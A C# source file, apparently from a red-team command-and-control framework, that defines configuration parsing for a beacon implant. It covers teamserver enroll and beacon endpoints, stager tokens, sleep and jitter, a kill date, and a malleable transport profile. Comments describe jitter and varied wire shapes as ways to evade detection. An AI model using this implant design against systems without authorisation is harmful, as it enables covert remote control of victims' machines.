namespace Rod.Implant.Internal;

// Carries the per-implant profile the reference .NET implant runs with. In the
// full design the profile is embedded into the artifact at generation time
// (architecture.md Sec 5.1) -- sleep, jitter, kill date, and the C2 endpoint
// are baked in so each implant is self-contained. The reference implant takes
// them as flags/env instead, so a single binary runs against any teamserver and
// the build unit can inject them via a generated source file without edits here.

/// <summary>
/// Everything the reference implant needs to enroll and beacon. Mirrors the Go
/// implant's config.Config: <see cref="EnrollURL"/> and <see cref="BeaconURL"/>
/// are the teamserver endpoints, <see cref="StagerToken"/> redeems at enroll,
/// sleep/jitter drive the check-in cadence, and <see cref="KillDate"/> is the
/// hard self-termination timestamp.
/// </summary>
internal sealed class Config
{
    /// <summary>
    /// The http(s) URL of the teamserver enroll endpoint (/implants/enroll). The
    /// implant redeems its stager token here and receives the leaf certificate
    /// plus CA chain bound to (implant_id, engagement_id) (architecture.md Sec 9).
    /// </summary>
    public string EnrollURL { get; set; } = string.Empty;

    /// <summary>
    /// The host:port (or https URL) of the mTLS beacon endpoint (the gRPC
    /// Beacon.CheckIn stream). The implant opens a long-lived reverse connection
    /// here after enrolling (architecture.md Sec 5/8). When empty it is derived
    /// from <see cref="EnrollURL"/>.
    /// </summary>
    public string BeaconURL { get; set; } = string.Empty;

    /// <summary>The one-use secret the operator minted for the engagement.</summary>
    public string StagerToken { get; set; } = string.Empty;

    /// <summary>
    /// The base interval between check-ins. Jitter is applied on top to avoid
    /// periodic-check-in detection (architecture.md Sec 7).
    /// </summary>
    public TimeSpan Sleep { get; set; } = TimeSpan.FromSeconds(30);

    /// <summary>
    /// The random delta added to each Sleep. Half the window either side, so a
    /// 10s jitter on a 30s sleep yields 25s..35s.
    /// </summary>
    public TimeSpan Jitter { get; set; } = TimeSpan.FromSeconds(10);

    /// <summary>
    /// The hard self-termination timestamp (architecture.md Sec 7). Enforced at
    /// startup (refuses to run) and at the top of every beacon cycle
    /// (self-terminates once passed).
    /// </summary>
    public DateTimeOffset KillDate { get; set; }

    /// <summary>
    /// Optionally, a PEM file pinning the teamserver CA the implant trusts as the
    /// mTLS server identity. When empty the implant trusts the CA chain returned
    /// at enroll (the dev CA shape). Letting enroll supply it keeps the reference
    /// binary CA-agnostic; a real deployment pins it at build time.
    /// </summary>
    public string CACertPath { get; set; } = string.Empty;

    /// <summary>
    /// The malleable transport profile applied to the enroll request
    /// (architecture.md Sec 7): the URI path, User-Agent, custom headers,
    /// per-request timeout, and body envelope that shape the wire so two implants
    /// do not look the same. Defaults leave the wire shape unchanged.
    /// </summary>
    public TransportProfile Transport { get; set; } = new();

    /// <summary>
    /// How one check-in cycle uses the beacon stream: "stream" holds the
    /// connection open (interactive, server-push tasking); "poll" drains queued
    /// tasking, closes, and sleeps the interval -- the low-and-slow OPSEC shape
    /// (architecture.md Sec 7). Baked at build time; flag/env override.
    /// </summary>
    public string Mode { get; set; } = BeaconModes.Stream;

    /// <summary>
    /// The verb set baked in at build time (the profile's "verbs" key,
    /// architecture.md Sec 5.2/5.3): the class's reduced set plus the
    /// contract-only verbs no class gates, so an out-of-tree handler compiled in
    /// for one of them can advertise. The beacon advertises the intersection of
    /// this set with the compiled handler registry, so a baked implant never
    /// claims a verb its class forbids or it cannot run. Empty for a dev binary
    /// built without a bake: it advertises its full compiled handler set.
    /// </summary>
    public IReadOnlyList<string> ClassVerbs { get; set; } = Array.Empty<string>();

    /// <summary>True when a kill date was supplied (env or flag or baked).</summary>
    public bool HasKillDate => KillDate != DateTimeOffset.MinValue;

    /// <summary>
    /// Composes the enroll host (EnrollURL with any path stripped) and the
    /// transport profile's enroll path, so a profiled implant enrolls against the
    /// path it was baked with rather than the teamserver's default route.
    /// </summary>
    public string ResolvedEnrollURL()
    {
        var host = EnrollURL;
        var path = Transport.EnrollPath;
        if (path.Length == 0)
            path = TransportProfile.DefaultEnrollPath;

        // Drop the teamserver default enroll path from the configured URL so the
        // profile's path replaces it cleanly.
        const string defaultSuffix = "/implants/enroll";
        if (host.EndsWith(defaultSuffix, StringComparison.OrdinalIgnoreCase))
            host = host[..^defaultSuffix.Length];
        // Strip any other trailing path on the host so the profile path appends
        // exactly once.
        var schemeIdx = host.IndexOf("://", StringComparison.Ordinal);
        if (schemeIdx >= 0)
        {
            var rest = host[(schemeIdx + 3)..];
            var slash = rest.IndexOf('/');
            if (slash >= 0)
                rest = rest[..slash];
            host = host[..(schemeIdx + 3)] + rest;
        }
        return host + path;
    }

    /// <summary>
    /// Builds a Config from command-line flags, falling back to the matching ROD_
    /// environment variable for each. Flags win over env. Required fields that are
    /// still empty after both are rejected with a usage error. Mirrors the Go
    /// implant's flag set verbatim so the two implants take the same arguments.
    /// </summary>
    public static Config Parse(string[] args)
    {
        var config = new Config
        {
            EnrollURL = Env("ROD_ENROLL_URL", string.Empty),
            BeaconURL = Env("ROD_BEACON_URL", string.Empty),
            StagerToken = Env("ROD_STAGER_TOKEN", string.Empty),
            Sleep = EnvTimeSpan("ROD_SLEEP", TimeSpan.FromSeconds(30)),
            Jitter = EnvTimeSpan("ROD_JITTER", TimeSpan.FromSeconds(10)),
            CACertPath = Env("ROD_CA_CERT", string.Empty),
            // Malleable transport profile (architecture.md Sec 7). Each knob
            // falls back to the matching ROD_* env, then to a no-op default, so a
            // profiled bake or an explicit flag changes the enroll wire shape and
            // an un-profiled build stays unchanged.
            Transport = new TransportProfile
            {
                EnrollPath = Env("ROD_ENROLL_PATH", string.Empty),
                UserAgent = Env("ROD_USER_AGENT", string.Empty),
                Envelope = Env("ROD_ENVELOPE", string.Empty),
                RequestTimeout = EnvTimeSpan("ROD_REQUEST_TIMEOUT", TimeSpan.Zero),
                Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
            },
            Mode = NormalizeMode(Env("ROD_MODE", BeaconModes.Stream)),
            ClassVerbs = ParseVerbList(Env("ROD_VERBS", string.Empty)),
        };
        var killDate = Env("ROD_KILL_DATE", string.Empty);
        if (killDate.Length > 0)
            config.KillDate = ParseKillDate(killDate);

        // Hand-rolled parse: no System.CommandLine dependency, matching the
        // "no ceremony" style of the Go flag set. Each flag takes the next arg
        // as its value; -h prints usage and exits with code 2.
        for (var i = 0; i < args.Length; i++)
        {
            var flag = args[i];
            switch (flag)
            {
                case "-h":
                case "--help":
                    Console.Error.WriteLine(Usage);
                    throw new ExitProgramException(2);
                case "-enroll-url":
                case "--enroll-url":
                    config.EnrollURL = TakeValue(args, ref i, flag);
                    break;
                case "-beacon-url":
                case "--beacon-url":
                    config.BeaconURL = TakeValue(args, ref i, flag);
                    break;
                case "-token":
                case "--token":
                    config.StagerToken = TakeValue(args, ref i, flag);
                    break;
                case "-sleep":
                case "--sleep":
                    config.Sleep = ParseGoDuration(TakeValue(args, ref i, flag), TimeSpan.FromSeconds(30));
                    break;
                case "-jitter":
                case "--jitter":
                    config.Jitter = ParseGoDuration(TakeValue(args, ref i, flag), TimeSpan.FromSeconds(10));
                    break;
                case "-kill-date":
                case "--kill-date":
                    config.KillDate = ParseKillDate(TakeValue(args, ref i, flag));
                    break;
                case "-ca-cert":
                case "--ca-cert":
                    config.CACertPath = TakeValue(args, ref i, flag);
                    break;
                case "-enroll-path":
                case "--enroll-path":
                    config.Transport.EnrollPath = TakeValue(args, ref i, flag);
                    break;
                case "-user-agent":
                case "--user-agent":
                    config.Transport.UserAgent = TakeValue(args, ref i, flag);
                    break;
                case "-envelope":
                case "--envelope":
                    config.Transport.Envelope = TakeValue(args, ref i, flag);
                    break;
                case "-request-timeout":
                case "--request-timeout":
                    config.Transport.RequestTimeout = ParseGoDuration(TakeValue(args, ref i, flag), TimeSpan.Zero);
                    break;
                case "-mode":
                case "--mode":
                    config.Mode = NormalizeMode(TakeValue(args, ref i, flag));
                    break;
                default:
                    throw new ExitProgramException(2, $"unknown flag: {flag}\n{Usage}");
            }
        }

        config.Validate();
        return config;
    }

    /// <summary>Enforces the required fields. BeaconURL may be empty when the
    /// enroll/beacon hosts coincide; the beacon client derives it then.</summary>
    private void Validate()
    {
        var missing = new List<string>();
        if (EnrollURL.Length == 0)
            missing.Add("-enroll-url/ROD_ENROLL_URL");
        if (StagerToken.Length == 0)
            missing.Add("-token/ROD_STAGER_TOKEN");
        if (missing.Count > 0)
            throw new ExitProgramException(2, $"missing required config: {string.Join(", ", missing)}\n{Usage}");
    }

    private const string Usage = """
        usage: rod-implant [flags]

          -enroll-url string   teamserver enroll endpoint (https://host:port/implants/enroll)
          -beacon-url string   teamserver mTLS beacon endpoint (host:port or https URL)
          -token string        stager token secret redeeming at enroll
          -sleep duration      beacon sleep interval (default 30s)
          -jitter duration     beacon jitter interval (default 10s)
          -mode string         check-in mode: stream (persistent) or poll (default stream)
          -kill-date string    RFC3339 kill date past which the implant exits
          -ca-cert string      optional PEM file pinning the teamserver CA to trust

        Each flag falls back to the matching ROD_* environment variable.
        """;

    // Validates the check-in mode; anything but stream/poll is a usage error
    // rather than a silent default, so a typoed bake or flag fails loudly.
    private static string NormalizeMode(string value)
    {
        var mode = value.Trim().ToLowerInvariant();
        if (mode is not (BeaconModes.Stream or BeaconModes.Poll))
            throw new ExitProgramException(2, $"mode must be 'stream' or 'poll', not '{value}'");
        return mode;
    }

    private static string Env(string key, string fallback)
        => Environment.GetEnvironmentVariable(key) is { Length: > 0 } v ? v : fallback;

    // Splits the comma-separated class verb list the bake emits ("a,b,c") into
    // the individual verbs, trimming whitespace and dropping empties so a stray
    // separator never registers a blank verb.
    private static IReadOnlyList<string> ParseVerbList(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            return Array.Empty<string>();
        return raw.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
    }

    private static TimeSpan EnvTimeSpan(string key, TimeSpan fallback)
    {
        var raw = Environment.GetEnvironmentVariable(key);
        return raw is { Length: > 0 } ? ParseGoDuration(raw, fallback) : fallback;
    }

    // Decodes the ROD_HEADERS value (a JSON object string, the same shape the
    // baked profile's "headers" field carries) into a header map. An empty or
    // malformed value yields an empty map so a bad bake never breaks enroll.
    private static Dictionary<string, string> ParseHeadersEnv(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            return new();
        try
        {
            using var doc = System.Text.Json.JsonDocument.Parse(raw);
            if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Object)
                return new();
            var headers = new Dictionary<string, string>();
            foreach (var prop in doc.RootElement.EnumerateObject())
            {
                var value = prop.Value.ValueKind == System.Text.Json.JsonValueKind.String
                    ? prop.Value.GetString() ?? string.Empty
                    : prop.Value.GetRawText();
                headers[prop.Name] = value;
            }
            return headers;
        }
        catch
        {
            return new();
        }
    }

    // Returns the value for the flag at index i, advancing i past it. Throws a
    // usage error when the flag has no following value.
    private static string TakeValue(string[] args, ref int i, string flag)
    {
        if (i + 1 >= args.Length)
            throw new ExitProgramException(2, $"flag needs an argument: {flag}\n{Usage}");
        i++;
        return args[i];
    }

    // Parses a Go-style duration ("30s", "1m", "500ms"). The baked profile and
    // the env values come from the Go-shaped build contract, so the implant
    // accepts the same syntax across build units.
    // Falls back to the supplied default on any parse failure.
    private static TimeSpan ParseGoDuration(string text, TimeSpan fallback)
    {
        if (string.IsNullOrWhiteSpace(text))
            return fallback;
        var span = text.AsSpan().Trim();
        var total = TimeSpan.Zero;
        var pos = 0;
        while (pos < span.Length)
        {
            // Leading sign is allowed once, at the start.
            var neg = false;
            if (span[pos] == '-' || span[pos] == '+')
            {
                neg = span[pos] == '-';
                pos++;
            }

            // Read the integer part.
            var intStart = pos;
            while (pos < span.Length && char.IsDigit(span[pos]))
                pos++;
            if (pos == intStart)
                return fallback;

            // Optional fractional part.
            double value;
            if (pos < span.Length && span[pos] == '.')
            {
                pos++;
                var fracStart = pos;
                while (pos < span.Length && char.IsDigit(span[pos]))
                    pos++;
                if (pos == fracStart)
                    return fallback;
                if (!double.TryParse(
                        span[intStart..pos].ToString(),
                        System.Globalization.NumberStyles.Float,
                        System.Globalization.CultureInfo.InvariantCulture,
                        out value))
                    return fallback;
            }
            else
            {
                if (!long.TryParse(span[intStart..pos], out var intValue))
                    return fallback;
                value = intValue;
            }

            // Unit suffix.
            var unitStart = pos;
            while (pos < span.Length && !char.IsDigit(span[pos]) && span[pos] != '.')
                pos++;
            if (pos == unitStart)
                return fallback;
            var unit = span[unitStart..pos].ToString();
            // Ticks per whole unit. TimeSpan resolution is 100ns (1 tick), so the
            // fractional parts below 100ns round -- fine for beacon intervals,
            // which are always whole seconds. "ns" is intentionally unsupported:
            // a beacon cadence in nanoseconds is nonsensical.
            const long ticksPerMicrosecond = 10;
            const long ticksPerMillisecond = ticksPerMicrosecond * 1000;
            const long ticksPerSecond = ticksPerMillisecond * 1000;
            const long ticksPerMinute = ticksPerSecond * 60;
            const long ticksPerHour = ticksPerMinute * 60;
            long? scaleTicks = unit switch
            {
                "us" or "µs" or "\u03bcs" => ticksPerMicrosecond,
                "ms" => ticksPerMillisecond,
                "s" => ticksPerSecond,
                "m" => ticksPerMinute,
                "h" => ticksPerHour,
                _ => null,
            };
            if (scaleTicks is null)
                return fallback;
            total += TimeSpan.FromTicks((long)(value * scaleTicks.Value));
            if (neg)
                total = -total;
        }
        return total;
    }

    private static DateTimeOffset ParseKillDate(string text)
    {
        // Accept RFC 3339 (the shape the bake emits) and the
        // round-trip "O" format; both parse with DateTimeOffset.Parse.
        if (!DateTimeOffset.TryParse(text, System.Globalization.CultureInfo.InvariantCulture,
                System.Globalization.DateTimeStyles.AssumeUniversal, out var date))
            throw new ExitProgramException(2, $"kill-date: cannot parse '{text}' as RFC3339");
        return date;
    }
}

/// <summary>The two check-in modes a beacon can run (see Config.Mode).</summary>
internal static class BeaconModes
{
    public const string Stream = "stream";
    public const string Poll = "poll";
}

/// <summary>
/// The malleable wire-shape profile applied to the enroll request
/// (architecture.md Sec 7). Each knob is optional and defaults to a value
/// that keeps the request identical to the un-profiled shape. Mirrors the Go
/// implant's config.TransportProfile.
/// </summary>
internal sealed class TransportProfile
{
    /// <summary>
    /// The teamserver's fixed enroll route, the value a profile fills in when it
    /// does not override the path.
    /// </summary>
    public const string DefaultEnrollPath = "/implants/enroll";

    /// <summary>The enroll timeout the reference implant used before the profile
    /// carried its own.</summary>
    public static readonly TimeSpan DefaultRequestTimeout = TimeSpan.FromSeconds(30);

    /// <summary>
    /// The URI path appended to the enroll host to form the enroll URL. Defaults
    /// to <see cref="DefaultEnrollPath"/>. A profile may set it to a malleable
    /// path a redirector rewrites.
    /// </summary>
    public string EnrollPath { get; set; } = string.Empty;

    /// <summary>The User-Agent header presented on enroll. Empty omits it.</summary>
    public string UserAgent { get; set; } = string.Empty;

    /// <summary>Extra HTTP headers applied to the enroll request. Empty adds none.</summary>
    public Dictionary<string, string> Headers { get; set; } = new();

    /// <summary>The per-request enroll timeout. Zero means the default (30s).</summary>
    public TimeSpan RequestTimeout { get; set; }

    /// <summary>How the enroll JSON body is shaped: "none" sends raw JSON, "base64"
    /// wraps it as a single base64 string. Empty means none.</summary>
    public string Envelope { get; set; } = string.Empty;

    /// <summary>True when the envelope wraps the enroll body as base64.</summary>
    public bool IsBase64Envelope =>
        Envelope.Equals("base64", StringComparison.OrdinalIgnoreCase);
}

/// <summary>
/// Thrown to request a clean exit with a specific code and message (usage error
/// or -h). The program's top level catches it, prints the message, and exits.
///
/// </summary>
internal sealed class ExitProgramException : Exception
{
    public int ExitCode { get; }

    // Tracks whether the caller supplied an explicit message. The base Message
    // property returns the type name when none was set, which the caller would
    // then print as noise; HasMessage lets "-h already printed usage" paths pass
    // null and stay quiet.
    public bool HasMessage { get; }
    public override string Message => HasMessage ? base.Message : string.Empty;

    public ExitProgramException(int exitCode, string? message = null)
        : base(message)
    {
        ExitCode = exitCode;
        HasMessage = message is not null;
    }
}
